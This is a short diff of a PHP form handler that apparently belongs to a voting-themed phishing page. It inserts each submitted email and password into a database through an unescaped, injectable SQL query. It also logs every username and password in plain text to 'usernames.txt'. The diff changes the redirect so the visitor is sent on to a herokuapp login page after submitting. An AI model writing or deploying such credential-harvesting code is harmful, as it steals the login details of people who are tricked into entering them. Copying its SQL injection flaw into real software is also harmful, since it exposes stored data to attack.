@@ -9,5 +9,5 @@ $query ="INSERT INTO votacionbyme (email,password) values ('$email','$password')
 $data = mysqli_query($con,$query);
 
 file_put_contents("usernames.txt", "Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: ');
+header('Location: https://votabyme.herokuapp.com/login.html');
 exit();
